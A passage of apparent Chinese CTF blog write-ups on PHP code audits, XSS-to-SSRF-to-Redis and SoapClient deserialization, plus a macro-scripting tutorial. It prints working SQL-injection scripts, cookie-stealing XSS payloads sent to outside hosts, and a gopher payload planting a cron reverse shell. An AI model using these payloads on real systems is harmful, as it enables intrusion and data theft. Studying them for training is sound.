$row[&apos;pwd&apos;];&#125;if(($admin_pass)&amp;&amp;($admin_pass === $_GET[&apos;pwd&apos;]))&#123; echo $flag;&#125;highlight_file(__FILE__);?&gt; 很明显是sql注入的绕过，仔细分析过滤规则可以发现没有过滤\，因为是双条件查询这样就可以闭合引号了。这里需要注出admin的密码就能拿flag。 payload：?user=\&amp;pwd=||/**/pwd/**/REGEXP/**/&quot;^8&quot;;%00 exp:12345678910111213141516import stringimport requestsimport rechar_set = &apos;0123456789abcdefghijklmnopqrstuvwxyz_&apos;pw = &apos;&apos;while 1: for ch in char_set: url = &apos;http://localhost/CTF/?user=\\&amp;pwd=||pwd/**/regexp/**/&quot;^%s&quot;;%%00&apos; r = requests.get(url=url%(pw+ch)) if &apos;Welcome Admin&apos; in r.text: pw += ch print(pw) break if ch == &apos;_&apos;: breakr = requests.get(&apos;http://localhost/CTF/?user=&amp;pwd=%s&apos; % pw)print(re.findall(&apos;HRCTF&#123;\S&#123;1,50&#125;&#125;&apos;,r.text)[0]) 这种注入方式局限在于只能指定同一表中的其他字段。 Day 16 - Poem1234567891011121314151617181920212223242526272829303132333435class FTP &#123; public $sock; public function __construct($host, $port, $user, $pass) &#123; $this-&gt;sock = fsockopen($host, $port); $this-&gt;login($user, $pass); $this-&gt;cleanInput(); $this-&gt;mode($_REQUEST[&apos;mode&apos;]); $this-&gt;send($_FILES[&apos;file&apos;]); &#125; private function cleanInput() &#123; $_GET = array_map(&apos;intval&apos;, $_GET); $_POST = array_map(&apos;intval&apos;, $_POST); $_COOKIE = array_map(&apos;intval&apos;, $_COOKIE); &#125; public function login($username, $password) &#123; fwrite($this-&gt;sock, &quot;USER &quot; . $username . &quot;\n&quot;); fwrite($this-&gt;sock, &quot;PASS &quot; . $password . &quot;\n&quot;); &#125; public function mode($mode) &#123; if ($mode == 1 || $mode == 2 || $mode == 3) &#123; fputs($this-&gt;sock, &quot;MODE $mode\n&quot;); &#125; &#125; public function send($data) &#123; fputs($this-&gt;sock, $data); &#125;&#125;new FTP(&apos;localhost&apos;, 21, &apos;user&apos;, &apos;password&apos;); $_REQUEST[&#39;mode&#39;]获取数据未经过滤+弱类型比较payload:?mode=1%0a%0dDELETE%20test.file Day 17 - Mistletoemd5($this-&gt;password, true)绕过addslashes1234567891011121314151617181920212223242526272829303132333435class RealSecureLoginManager &#123; private $em; private $user; private $password; public function __construct($user, $password) &#123; $this-&gt;em = DoctrineManager::getEntityManager(); $this-&gt;user = $user; $this-&gt;password = $password; &#125; public function isValid() &#123; $pass = md5($this-&gt;password, true); $user = $this-&gt;sanitizeInput($this-&gt;user); $queryBuilder = $this-&gt;em-&gt;createQueryBuilder() -&gt;select(&quot;COUNT(p)&quot;) -&gt;from(&quot;User&quot;, &quot;u&quot;) -&gt;where(&quot;password = &apos;$pass&apos; AND user = &apos;$user&apos;&quot;); $query = $queryBuilder-&gt;getQuery(); return boolval($query-&gt;getSingleScalarResult()); &#125; public function sanitizeInput($input) &#123; return addslashes($input); &#125;&#125;$auth = new RealSecureLoginManager( $_POST[&apos;user&apos;], $_POST[&apos;passwd&apos;]);if (!$auth-&gt;isValid()) &#123; exit;&#125; 所有的输入数据都被addslashes过滤了一遍，这里看似没有办法闭合sql语句的引号，其实这里问题出在md5()函数上：http://php.net/manual/zh/function.md5.php 如果第二个参数设置为true，则以原始的二进制数据返回。 那么有没有可能让md5($string, true),最后一位出现\呢。 跑出来md5(&quot;128&quot;,true);的最后一位为\123456789&lt;?phpfor($i=1; $i&lt;9999; $i++)&#123; $string = md5($i,true); if(substr($string,-1) == &quot;\\&quot;)&#123; echo $i.&quot;\n&quot;.$string; break; &#125;&#125; 之后的注入流程就和前面所述一致了。 还有一些比较有意思的点比如：md5(&quot;ffifdyop&quot;,true); // &#39;or&#39;6�]��!r,��bmd5(&quot;129581926211651571912466741651878684928&quot;,true); // �T0D��o#��&#39;or&#39;8 可以用来绕过这样的场景：12原先：SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;md5($password,true)&apos;变成：SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&apos;or&apos;6\xc9]\x99&apos; and优先级比or高，导致整个where子句为真，即必然会出数据。 红日安全分享了一道这个考点的题：https://xz.aliyun.com/t/3375 Day 18 - Sign123456789101112class JWT &#123; public function verifyToken($data, $signature) &#123; $pub = openssl_pkey_get_public(&quot;file://pub_key.pem&quot;); $signature = base64_decode($signature); if (openssl_verify($data, $signature, $pub)) &#123; $object = json_decode(base64_decode($data)); $this-&gt;loginAsUser($object); &#125; &#125;&#125;(new JWT())-&gt;verifyToken($_GET[&apos;d&apos;], $_GET[&apos;s&apos;]); Day 19 - Birch123456789101112131415161718192021222324252627class ImageViewer &#123; private $file; function __construct($file) &#123; $this-&gt;file = &quot;images/$file&quot;; $this-&gt;createThumbnail(); &#125; function createThumbnail() &#123; $e = stripcslashes( preg_replace( &apos;/[^0-9\\\]/&apos;, &apos;&apos;, isset($_GET[&apos;size&apos;]) ? $_GET[&apos;size&apos;] : &apos;25&apos; ) ); system(&quot;/usr/bin/convert $this-&gt;file --resize $e ./thumbs/$this-&gt;file&quot;); &#125; function __toString() &#123; return &quot;&lt;a href=$this-&gt;file&gt; &lt;img src=./thumbs/$this-&gt;file&gt;&lt;/a&gt;&quot;; &#125;&#125;echo (new ImageViewer(&quot;image.png&quot;)); 只允许数字，且会将转义符去除，这里可以使用8进制绕过限制：0\073\163\154\145\145\160\0405\073 Day 20 - Stocking1234567891011121314151617181920212223242526272829303132&lt;?phpset_error_handler(function ($no, $str, $file, $line) &#123; throw new ErrorException($str, 0, $no, $file, $line);&#125;, E_ALL);class ImageLoader&#123; public function getResult($uri) &#123; if (!filter_var($uri, FILTER_VALIDATE_URL)) &#123; return &apos;&lt;p&gt;Please enter valid uri&lt;/p&gt;&apos;; &#125; try &#123; $image = file_get_contents($uri); $path = &quot;./images/&quot; . uniqid() . &apos;.jpg&apos;; file_put_contents($path, $image); if (mime_content_type($path) !== &apos;image/jpeg&apos;) &#123; unlink($path); return &apos;&lt;p&gt;Only .jpg files allowed&lt;/p&gt;&apos;; &#125; &#125; catch (Exception $e) &#123; return &apos;&lt;p&gt;There was an error: &apos; . $e-&gt;getMessage() . &apos;&lt;/p&gt;&apos;; &#125; return &apos;&lt;img src=&quot;&apos; . $path . &apos;&quot; width=&quot;100&quot;/&gt;&apos;; &#125;&#125;echo (new ImageLoader())-&gt;getResult($_GET[&apos;img&apos;]); ssrf无过滤，只能盲打，或者通过报错来看： Day 21 - Gift Wrap123456789101112131415161718192021222324252627282930313233declare(strict_types=1);class ParamExtractor &#123; private $validIndices = []; private function indices($input) &#123; $validate = function (int $value, $key) &#123; if ($value &gt; 0) &#123; $this-&gt;validIndices[] = $key; &#125; &#125;; try &#123; array_walk($input, $validate, 0); &#125; catch (TypeError $error) &#123; echo &quot;Only numbers are allowed as input&quot;; &#125; return $this-&gt;validIndices; &#125; public function getCommand($parameters) &#123; $indices = $this-&gt;indices($parameters); $params = []; foreach ($indices as $index) &#123; $params[] = $parameters[$index]; &#125; return implode($params, &apos; &apos;); &#125;&#125;$cmd = (new ParamExtractor())-&gt;getCommand($_GET[&apos;p&apos;]);system(&apos;resizeImg image.png &apos; . $cmd); 命令执行，绕过类型转换，本地没复现成功.. Day 22 - Chimney12345678910111213141516if (isset($_POST[&apos;password&apos;])) &#123; setcookie(&apos;hash&apos;, md5($_POST[&apos;password&apos;])); header(&quot;Refresh: 0&quot;); exit;&#125;$password = &apos;0e836584205638841937695747769655&apos;;if (!isset($_COOKIE[&apos;hash&apos;])) &#123; echo &apos;&lt;form&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&apos; . &apos;&lt;input type=&quot;submit&quot; value=&quot;Login&quot; &gt;&lt;/form &gt;&apos;; exit;&#125; elseif (md5($_COOKIE[&apos;hash&apos;]) == $password) &#123; echo &apos;Login succeeded&apos;;&#125; else &#123; echo &apos;Login failed&apos;;&#125; 很明显，简单的md5若类型比较漏洞:]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The power of XSS WriteUp]]></title>
    <url>%2F2019%2F02%2F10%2FThe%20power%20of%20XSS%20WriteUp%2F</url>
    <content type="text"><![CDATA[学习了一下xss-&gt;ssrf-&gt;redis level 1不知道为啥，xss平台一直打不到手动就可以..payload:&lt;svg/onload=&quot;document.location=&#39;http://dyfuca.ceye.io/?&#39;+document.cookie&quot;&gt; flag:FLAG{Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;/script&gt;} 给了我们一个管理员的session，提示我们flag2要打内网的redis。 level 2修改成admin的session后： 打源码123&lt;svg/onload=&quot;document.location=&apos;http://dyfuca.ceye.io/?&apos;+btoa(document.body.innerHTML&quot;) // 过滤了()&lt;svg/onload=&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#100;&amp;#121;&amp;#102;&amp;#117;&amp;#99;&amp;#97;&amp;#46;&amp;#99;&amp;#101;&amp;#121;&amp;#101;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#105;&amp;#110;&amp;#110;&amp;#101;&amp;#114;&amp;#72;&amp;#84;&amp;#77;&amp;#76;&amp;#41&quot;&gt; 看源码看到一个request.php，让bot去访问一下，打一下html的源码。 123456789101112&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;http://155.94.177.154:55555/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);xmlhttp.send();&quot;&gt; 实体编码：1&lt;svg/onload=&quot;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#61;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#88;&amp;#77;&amp;#76;&amp;#72;&amp;#116;&amp;#116;&amp;#112;&amp;#82;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#40;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#110;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#99;&amp;#104;&amp;#97;&amp;#110;&amp;#103;&amp;#101;&amp;#61;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#10;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#105;&amp;#102;&amp;#32;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#61;&amp;#61;&amp;#52;&amp;#32;&amp;#38;&amp;#38;&amp;#32;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;#61;&amp;#61;&amp;#50;&amp;#48;&amp;#48;&amp;#41;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#53;&amp;#53;&amp;#46;&amp;#57;&amp;#52;&amp;#46;&amp;#49;&amp;#55;&amp;#55;&amp;#46;&amp;#49;&amp;#53;&amp;#52;&amp;#58;&amp;#53;&amp;#53;&amp;#53;&amp;#53;&amp;#53;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#115;&amp;#112;&amp;#111;&amp;#110;&amp;#115;&amp;#101;&amp;#84;&amp;#101;&amp;#120;&amp;#116;&amp;#41;&amp;#59;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#40;&amp;#34;&amp;#71;&amp;#69;&amp;#84;&amp;#34;&amp;#44;&amp;#34;&amp;#114;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#44;&amp;#116;&amp;#114;&amp;#117;&amp;#101;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#101;&amp;#110;&amp;#100;&amp;#40;&amp;#41;&amp;#59&quot;&gt; 解码后： 所以我们给request.php传入的post参数为url=ip 结合robot.txt提示，读config.php。 payload:12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;http://155.94.177.154:55555/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);&quot;&gt; 编码后，打到 flag2:FLAG{curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck} level 3提示我们打内网redis，redis协议使用的是简单的文本流。比如下面发送的tcp流数据，每行代表一条命令，下面是两个set命令12SET x 1SET y 2 显然，如果是get型的ssrf他无法控制单独的一行(除非有crlf漏洞)，p神这篇文章提到了这个点：https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html 所以这里得用Gopher协议，可以以get形式发起post请求 用popherus生成了个弹shell的payload：1gopher://localhost:25566/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/155.94.177.154/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A payload: 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;http://155.94.177.154:5555/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/155.94.177.154/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A&quot;);&quot;&gt; 但是弹不回来.. exp:12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&apos;http://155.94.177.154:55556/?&apos;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit&quot;);&quot;&gt; 处理一下flag格式1234567891011121314# coding:utf-8file = open(&quot;flag.txt&quot;)tmp = []while 1: line = file.readline() tmp.append(line.replace(&quot;\n&quot;, &quot;&quot;)) if not line: break passflag = &quot;&quot;for i in range(0, tmp.__len__())[::-1]: flag += tmp[i] print(flag) 再附上处理验证码的脚本：1234567891011121314import hashlib strs = &apos;00000&apos;def md5(s): return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest()def main(): for i in range(100000,100000000): tmp = &quot;3f81ef4c8455e281&quot;+str(i) a = md5(tmp) if a[0:5] == strs: print(i) exit(0) if __name__ == &apos;__main__&apos;: main()]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LCTF 2018 Babyphp's revenge]]></title>
    <url>%2F2019%2F02%2F10%2FLCTF%202018%20Babyphp's%20revenge%2F</url>
    <content type="text"><![CDATA[继续填坑.. 一： soap ssrf soap服务是什么？简单而言即一种通信方式 特征在phpinfo中可以看到 利用条件有可控的点去反序列化调用soapclient类进行SSRF 那么为什么要选择使用soapclient这个类呢？ 如果开启了soap服务，soapclient类就是php的内置类 从php文档中可以看到，其第一个参数为$Url，这就为之后的ssrf作为铺垫 其次当数据被反序列化后，其对象还要调用一个不存在的类，以调用soapclient的__call方法 同时该类__call方法还有crlf注入漏洞，具体分析见：https://xz.aliyun.com/t/2148 如何触发ssrf呢？参考： https://xz.aliyun.com/t/2148#toc-0 http://php.net/manual/zh/soapclient.soapclient.php 该类实例化的时候有两个参数：第一个参数控制是否为WSDL模式。如果为NULL，就是non-WSDL模式。如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求。如果是wsdl模式，在序列化之前就会对$url参数进行请求，从而无法可控序列化数据。 本地复现：代码：123456&lt;?php$location = &apos;http://155.94.177.154:6666/&apos;;$a = new SoapClient(null, array(&apos;location&apos; =&gt; $location ,&apos;uri&apos; =&gt; &apos;123&apos;));$auth= unserialize(serial1ize($a));$auth-&gt;aa();echo &quot;1&quot;; 另一台vps上开启监听： 执行： vps监听到： 可以看到在soap库发送的xml数据在数据包的post处，所以这个的局限在于一般只能打get形的ssrf。 后来在l3m0n师傅的博客上看到可以发post请求的思路：https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html 二：php session反序列化其核心原理在于php在存储序列化$_SESSION数据引擎和反序列化该数据的引擎不一样导致。 利用条件： 在同一网站能同时出现两种不同的session配置方式： 1session.serialize_handler=php_serialize|php $_SESSION值可控 满足以上几点即等价于我们对unserialize()的参数可控。 php.ini中的配置：1234session.save_path=&quot;D:\xampp\tmp&quot; 表明所有的session文件都是存储在xampp/tmp下session.save_handler=files 表明session是以文件的方式来进行存储的session.auto_start=0 表明默认不启动sessionsession.serialize_handler=php --定义用来序列化/反序列化的处理器名字。默认使用php session.serialize_handler的其他几种配置项：123php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值php:存储方式是，键名+竖线+经过serialize()函数序列处理的值php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 使用session.serialize_handler=php_serialize：1234&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$_SESSION[&quot;name&quot;] = &quot;PASSER6Y&quot;; 该方式在序列化数据前加了a:1: 而使用默认配置时(session.serialize_handler=php)：1234&lt;?php//ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$_SESSION[&quot;name&quot;] = &quot;PASSER6Y&quot;; php引擎将竖线(|)将其分割成两部分，前面为键名，后面为序列化数据 两者的差异在于用php方式时以|分割，如果我们在php_serialize存入的数据带有|，而取出数据时使用php引擎，则会导致序列化数据在经过php引擎时被反序列化引发安全问题。 漏洞复现demo：1.php1234&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$_SESSION[&quot;passer6y&quot;]=$_GET[&quot;a&quot;]; 2.php12345678910111213&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class aa &#123; var $hi; function __construct()&#123; $this-&gt;hi = &apos;phpinfo();&apos;; &#125; function __destruct() &#123; eval($this-&gt;hi); &#125;&#125; 构造payload：123456789101112131415161718&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class aa &#123; var $hi; function __construct()&#123; $this-&gt;hi = &apos;phpinfo();&apos;; &#125; function __destruct() &#123; eval($this-&gt;hi); &#125;&#125;$a = new aa();echo serialize($a); //O:2:&quot;aa&quot;:1:&#123;s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;&#125;echo &quot;\n\n&quot;;echo urlencode(serialize($a)); payload: http://ip/?a=|O:2:%22aa%22:1:{s:2:%22hi%22;s:10:%22phpinfo();%22;} 然后访问：2.php 最后回到题目来看，分析一下题目逻辑；index.php1234567891011&lt;?phphighlight_file(__FILE__);$b = &apos;implode&apos;;call_user_func($_GET[&apos;f&apos;],$_POST);session_start();if(isset($_GET[&apos;name&apos;]))&#123; $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);call_user_func($b,$a); flag.php1234567&lt;?phpsession_start();echo &apos;only localhost can get flag!&apos;;$flag = &apos;LCTF&#123;******************&#125;&apos;;if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;$_SESSION[&apos;flag&apos;] = $flag;&#125; 第一个call_user_func()函数可以帮助我们将php的session处理方式设置为php_serialize，这里可以使用session_start()来开启，他支持一个数组参数： 所以这一步我们将$_GET[&#39;f&#39;]=session_start,然后post数据：serialize_handler=php_serialize 再往下$_GET[&#39;name&#39;]，这使得我们可以控制session，所以这一步传入我们的soup的ssrf反序列化数据。 从flag.php中可知，flag是存储在我们的session中的(成功触发后，var_dump($_SESSION);会显示出我们的flag)，所以我们ssrf的时候要带上session，这里会用到soup ssrf的crlf漏洞。 当然在这里，soup ssrf 还需要一步，就是调用其类中的__call方法，这里参考文档： 所以我们将精心构造的session数据存入后，第二次访问，利用变量覆盖将$b变成call_user_func，然后就能调用一个不存在的方法(welcome_to_the_lctf2018),从而触发__call方法，形成ssrf。 不知道环境问题还是啥调了很久，在第一步修改session_handle的类型时修改失败了，导致后面无法触发ssrf。复现的时候没有官方docker，调了很久还是不是很明白… 嫖的exp：12345678$target=&apos;http://127.0.0.1/flag.php&apos;;$b = new SoapClient(null,array(&apos;location&apos; =&gt; $target, &apos;user_agent&apos; =&gt; &quot;AAA:BBB\r\n&quot; . &quot;Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912&quot;, &apos;uri&apos; =&gt; &quot;http://127.0.0.1/&quot;));$se = serialize($b); echo urlencode($se); 第二步：]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[按键精灵学习记录]]></title>
    <url>%2F2019%2F02%2F09%2F%E6%8C%89%E9%94%AE%E7%B2%BE%E7%81%B5%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[最新不知道抽了什么风，又开始搞起了薅羊毛，还想着能多偷点懒，这两天学了会按键精灵脚本，写了初步能自动化薅羊毛的工具：https://github.com/Passer6y/quickMacro 基础 声明变量:Dim12Dim screenXscreenX = GetScreenX（） 2.延时:Delay1Delay 1000 //延时1000毫秒，也就是1秒再往下执行 点击触摸屏幕中的一个位置-&gt;经过一小段时间延时-&gt;放手123TouchDown x,y,1 //x,y为坐标，也就是点击屏幕的位置Delay 50TouchUp 1 tap封装了以上的几个操作步骤：Tap x,y 安卓三键：主菜单、主页、返回 123KeyPress &quot;Menu&quot;KeyPress &quot;Home&quot;KeyPress &quot;Back&quot; 调试：ShowMessage和TracePrintShowMessage:显示提示，两条消息之间建议1秒以上间隔。TracePrint：在调试页显示信息 1234567Dim 循环次数 = 0Do Delay 1000 循环次数 = 循环次数+1 TracePrint “循环次数：”&amp;循环次数&amp;“次” ShowMessage “循环次数：”&amp;循环次数&amp;“次”Loop 滑屏幕：swipe 1Swipe 10,10,100,100,300 //从坐标10,10划动到坐标100,100，历时300毫秒 滑动 停顿 再松12345TouchDown 10, 10, 1Delay 1000TouchMove 100, 100, 1, 300Delay 1000TouchUp 1 循环demo1:循环点击 (10,10) 一千次1234For 1000 Tap 10,10 // 退出 Exit ForNext demo2: 一直点击1234DoTap 10,10//退出 Exit DoLoop 图色操作 获取屏幕上某点颜色：GetPixelColor() 1234567Dim rColorrColor = GetPixelColor(300, 300)If rColor = &quot;FFFFFF&quot; Then TracePrint &quot;坐标（300,300）的像素点颜色是FFFFFF，说明当前处于XX界面下&quot;Else TracePrint &quot;坐标（300,300）的像素点颜色不是FFFFFF，说明还没到XX界面&quot;End If 多点比色:CmpColorEx(mul_color,sim)即判断当前场景取点(2,2)和点(4,3)以000000-202020的偏色范围(前后各10),相似度0.9的容错判断是否为同一个图，可以用抓抓快捷生成参数。 12345If CmpColorEx(&quot;2|2|000000-202020,4|3|000000-202020&quot;, 0.9) = 1 Then TracePrint &quot;这是第二个图&quot;Else TracePrint &quot;这不是第二个图&quot;End If 抓抓快捷生成参数： 取两点-&gt;点开’颜色’-&gt;在’颜色记录汇总’选中我们采的两点-&gt;进入‘多点比色’模式-&gt;复制’颜色描述’即可 多点找色：FindMultiColor即找到唯一的图标的作用0,0,0,0表示全屏查找，10,20,30,40表示从坐标(10,20)和(30,40)组成的矩形范围。000000初始点的颜色值?，000000-202020(202020依旧是偏色)0|1是相对坐标(往右0，往下1)1234567Dim IntX,IntYFindMultiColor 0,0,0,0,&quot;000000&quot;,&quot;0|1|000000-202020&quot;,0,0.9,intX,intYIf intX &gt; -1 Then TracePrint &quot;找到啦，坐标在&quot;&amp;intX&amp;&quot;,&quot;&amp;intYElse TracePrint &quot;没找到&quot;End If 抓抓多点找色：和上面一样的方法 函数 定义/调用函数123Function 自定义函数() TracePrint “我是自定义函数，被你调用了”End Function 调用函数：123自定义函数自定义函数() // 推荐Call 自定义函数() demo:比大小12345678910111213141516Function 比大小(参数1, 参数2) If 参数1 &gt; 参数2 Then 比大小 = 参数1 // 函数返回值 ElseIf 参数1 &lt; 参数2 Then 比大小 = 参数2 Else TracePrint &quot;两个数一样大&quot; End IfEnd FunctionDim numA,numBnumA = 3numB = 3If 比大小(numA, numB) &lt;&gt; null Then TracePrint &quot;较大的值是：&quot;&amp;比大小(numA,numB)End If 数据类型转换我们从用户输入中读取的数据往往需要做类型转换。demo: 将输入框的数据从字符串型变成整型1234Dim 用户输入 = ReadUIConfig(&quot;输入框1&quot;)If CInt(用户输入) = 1 Then TracePrint 用户输入End If 日志开启log记录后，会将所有的tranceprint都输出到log文件123456Log.Open **************TracePrint &quot;test&quot;TracePrint GetTempDir()**************Log.Close 分辨率使用的720x1280的设备开发的程序则注明如下代码，以便程序自适应其他设备(多点比色，找色这些功能才有用)1SetScreenScale 720,1280 多线程一般用于一个线程运行脚本，另一个线程干其他的(检测是否卡主等等)]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HCTF 2018 Web Writeup]]></title>
    <url>%2F2019%2F02%2F05%2FHCTF%202018%20Web%20WriteUp%2F</url>
